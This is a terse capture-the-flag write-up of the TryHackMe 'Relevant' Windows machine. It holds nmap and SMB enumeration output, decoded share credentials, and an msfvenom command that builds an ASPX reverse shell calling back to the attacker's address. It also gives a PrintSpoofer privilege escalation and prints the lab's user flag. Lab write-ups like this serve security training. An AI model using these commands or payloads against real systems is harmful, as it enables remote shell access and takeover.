# Relevant THM

>Nathaniel Mickel | 15 Sept, 2021

```bash
export IP=10.10.88.247
```
# Initial NMAP
```
Nmap 7.91 scan initiated Wed Sep 15 12:11:32 2021 as: nmap -sC -sV -oN nmap/initial 10.10.88.247
Nmap scan report for 10.10.88.247
Host is up (0.18s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-09-15T17:11:54+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-09-14T17:01:31
|_Not valid after:  2022-03-16T17:01:31
|_ssl-date: 2021-09-15T17:12:34+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-15T10:11:58-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-15T17:11:55
|_  start_date: 2021-09-15T17:01:46
```
# Aggressive NMAP
```
Nmap 7.91 scan initiated Wed Sep 15 12:41:12 2021 as: nmap -A -p- -oN nmap/aggressive -v 10.10.88.247
Increasing send delay for 10.10.88.247 from 0 to 5 due to 56 out of 186 dropped probes since last increase.
Increasing send delay for 10.10.88.247 from 5 to 10 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.10.88.247 from 10 to 20 due to 11 out of 13 dropped probes since last increase.
Nmap scan report for 10.10.88.247
Host is up (0.14s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-09-15T17:55:49+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-09-14T17:01:31
| Not valid after:  2022-03-16T17:01:31
| MD5:   fc98 d694 c67d ff44 0bb6 83d4 6e21 91b7
|_SHA-1: 1986 c988 764e 6350 4572 94fb c119 b07d 3589 499f
|_ssl-date: 2021-09-15T17:56:28+00:00; 0s from scanner time.
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-15T10:55:50-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-15T17:55:53
|_  start_date: 2021-09-15T17:01:46
```
# SMB Enumeration
```
map -p445 --script=smb-vuln-* $IP -v                                                                                                                             1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 12:35 CDT
NSE: Loaded 11 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:35
Completed NSE at 12:35, 0.00s elapsed
Initiating Ping Scan at 12:35
Scanning 10.10.88.247 [2 ports]
Completed Ping Scan at 12:35, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:35
Completed Parallel DNS resolution of 1 host. at 12:35, 0.02s elapsed
Initiating Connect Scan at 12:35
Scanning 10.10.88.247 [1 port]
Discovered open port 445/tcp on 10.10.88.247
Completed Connect Scan at 12:35, 0.21s elapsed (1 total ports)
NSE: Script scanning 10.10.88.247.
Initiating NSE at 12:35
Completed NSE at 12:35, 14.05s elapsed
Nmap scan report for 10.10.88.247
Host is up (0.17s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap 7.91 scan initiated Wed Sep 15 12:34:39 2021 as: nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains -p 135,139,445 -v -oN nmap/smb 10.10.88.247
Nmap scan report for 10.10.88.247
Host is up (0.19s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.88.247\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.88.247\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.88.247\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.88.247\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-15T10:34:44-07:00

smbmap -u Bob -p '!P@$$W0rD!123' -H 10.10.88.247
[+] IP: 10.10.88.247:445	Name: 10.10.88.247                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	nt4wrksv                                          	READ, WRITE	

```
# passwords.txt file 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw== (Bob - !P@$$W0rD!123)
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk (Bill - Juw4nnaM4n420696969!$$$)

# MSFVenom Payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.15.174 LPORT=1337 -f aspx -o reverse_shell.apsx

User Flag=THM{fdk4ka34vk346ksxfr21tg789ktf45}
```
# Privledge Escalation
```
whoami /priv
SeImpersonate
PrintSpoofer.exe -i -c cmd
```
